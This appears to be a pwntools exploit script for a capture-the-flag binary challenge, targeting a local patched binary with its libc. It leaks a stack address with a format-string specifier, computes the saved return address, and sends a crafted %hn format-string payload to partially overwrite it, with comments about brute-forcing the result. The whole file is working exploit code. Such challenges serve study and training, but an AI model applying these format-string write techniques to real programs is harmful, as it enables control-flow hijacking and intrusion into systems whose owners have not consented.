from pwn import *

binary = './attachment_patched'
libc = ELF('./libc.so.6')

p = process(binary)

s = '''
b * printf
b * printf+198
'''


payload = b"%6$p" # can only leak one address
p.sendline(payload)


p.recvuntil(b"give you one chance!!!\n")

leak = p.recvuntil("begin", drop = True).strip().decode()
leak = int(leak, 16)
rip = leak - 0x120


print(hex(rip))

bytes_to_write = rip & 0xffff
print(hex(bytes_to_write))

#address to partial overwrite:
# rip, rip + 1

# bytes to write: \x90 on rip, \xaf on rip + 1

first_byte = 0x90
gdb.attach(p, s)
#payload = f"%{first_byte}c%$hhn------".encode()
payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()

# 0x5f90 on argument 41
bytes_to_write = 0x10000 - bytes_to_write + 0x140b + 5
payload += f"%{bytes_to_write}c%41$hn".encode()

p.sendline(payload)

# doing partial overwrite above, add a brute-force wrapper
# when we see "give you one chance!!!", we win
# otherwise it's EOF

p.interactive()
